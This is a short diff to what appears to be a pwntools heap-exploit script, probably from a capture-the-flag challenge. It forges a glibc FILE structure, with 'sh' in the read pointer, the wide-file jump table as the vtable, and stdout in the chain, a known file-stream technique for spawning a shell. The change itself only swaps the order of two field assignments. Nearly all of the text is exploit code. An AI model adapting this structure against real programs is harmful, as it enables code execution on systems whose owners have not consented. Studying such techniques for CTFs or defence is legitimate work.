@@ -150,8 +150,8 @@ delete(0)
 io = FileStructure()
 io.flags = 0x3b01010101010101
 io._IO_read_ptr = b'sh'
-io._IO_write_ptr = heap_base
 io._IO_write_base = 0
+io._IO_write_ptr = heap_base
 io.chain = libc.sym._IO_2_1_stdout_
 io.vtable = libc.sym._IO_wfile_jumps
 io._lock = libc.sym._IO_stdfile_2_lock
